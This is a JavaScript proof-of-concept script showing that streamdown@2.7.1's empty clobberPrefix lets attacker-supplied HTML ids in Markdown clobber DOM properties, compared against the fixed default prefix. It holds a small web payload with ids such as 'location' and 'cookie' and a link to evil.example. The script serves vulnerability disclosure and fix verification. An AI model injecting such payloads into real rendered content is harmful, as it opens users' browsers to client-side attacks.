/**
 * PoC: streamdown@2.7.1 ships rehype-sanitize with clobberPrefix:"" so
 * attacker-controlled raw HTML ids in Markdown survive unprefixed and can
 * DOM-clobber window/document named properties. Fixed on main (#695 /
 * 66779a8856) by restoring the default user-content- prefix.
 *
 * This script mirrors the sanitize schema from the published 2.7.1 bundle
 * (chunk-7TTQLYRW.js: Ct={...defaultSchema,clobberPrefix:""}) and the fixed
 * schema, without needing a full React tree.
 */
import {unified} from 'unified';
import remarkParse from 'remark-parse';
import remarkRehype from 'remark-rehype';
import rehypeRaw from 'rehype-raw';
import rehypeSanitize, {defaultSchema} from 'rehype-sanitize';
import rehypeStringify from 'rehype-stringify';

const vulnSchema = {
  ...defaultSchema,
  clobberPrefix: "", // as shipped in streamdown@2.7.1
};
const fixedSchema = {
  ...defaultSchema,
  // defaultSchema already has clobberPrefix: 'user-content-'
};

const md = [
  'Hello from the model.',
  '',
  '<!-- attacker-controlled raw HTML in streamed Markdown -->',
  '<img id="location" src="x">',
  '<form id="cookie"><input id="toString" name="x"></form>',
  '<a id="getElementById" href="https://evil.example">click</a>',
].join('\n');

async function render(schema) {
  const file = await unified()
    .use(remarkParse)
    .use(remarkRehype, {allowDangerousHtml: true})
    .use(rehypeRaw)
    .use(rehypeSanitize, schema)
    .use(rehypeStringify)
    .process(md);
  return String(file);
}

const vuln = await render(vulnSchema);
const fixed = await render(fixedSchema);
console.log('=== streamdown@2.7.1-equivalent (clobberPrefix:"") ===');
console.log(vuln);
console.log('\n=== fixed (default user-content- prefix) ===');
console.log(fixed);

const ids = (html) => [...html.matchAll(/\bid="([^"]+)"/g)].map(m => m[1]);
const vulnIds = ids(vuln);
const fixedIds = ids(fixed);
const dangerous = ['location', 'cookie', 'getElementById', 'toString'];
console.log('\n=== VERDICT ===');
console.log('vuln ids:', vulnIds);
console.log('fixed ids:', fixedIds);
console.log('dangerous ids preserved in vuln?', dangerous.filter(d => vulnIds.includes(d)));
console.log('dangerous ids preserved in fixed?', dangerous.filter(d => fixedIds.includes(d)));
if (dangerous.some(d => vulnIds.includes(d)) && !dangerous.some(d => fixedIds.includes(d))) {
  console.log('CONFIRMED: 2.7.1-equivalent schema preserves clobberable ids; fix prefixes them.');
  process.exit(0);
}
process.exit(1);
